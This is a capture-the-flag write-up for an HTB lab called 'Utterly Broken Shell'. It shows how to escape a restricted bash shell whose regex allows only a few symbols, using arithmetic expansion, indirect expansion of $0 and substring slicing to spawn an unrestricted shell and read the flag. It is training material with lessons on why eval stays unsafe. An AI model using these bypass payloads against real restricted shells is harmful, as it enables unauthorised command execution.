---
ctf: HTBLabs
title: Utterly Broken Shell
category: misc
difficulty: unknown
tags: []
flag_format: HTB{...}
date: 2026-08-12
---

# Utterly Broken Shell

## Challenge
This time we reduced the RegEx even more to patch all previous bypasses. Now it should be impossible to bypass, right? Right?? IP: 154.57.164.82:32617

## Approach

The filter only permits `$`, `{}`, `!`, whitespace, `:`, `_`, `=`, and
parentheses. Bash arithmetic expansion still lets us synthesize numbers:

```bash
___=$((!(___==___)))   # 0
____=$((___==___))     # 1
```

An indirect expansion with the generated zero exposes `$0`:

```bash
__=${!___}
```

On the target, `$0` is `/home/restricted_user/broken_shell.sh`. We can peel one
character from the front and execute each two-character window using only
allowed syntax:

```bash
${__:___:____}${__:____:____}
__=${__:____}
```

Repeat those two lines until the window reaches the final `sh`. That launches
an unrestricted child shell. Then read the flag normally:

```bash
cat /home/restricted_user/flag_you_found_it_gg
```

## Tools

- `nc`
- Bash parameter expansion and arithmetic expansion
- `base64` (to verify that the question marks in the flag are literal)

## Lessons

- A character allowlist does not make `eval` safe when Bash expansions remain.
- `$((...))` can create numeric values without typing digits.
- `${!name}` can indirectly access special positional parameters such as `$0`.
- Substring expansion can turn an existing trusted string into executable text.

## Flag

`HTB{redacted}`
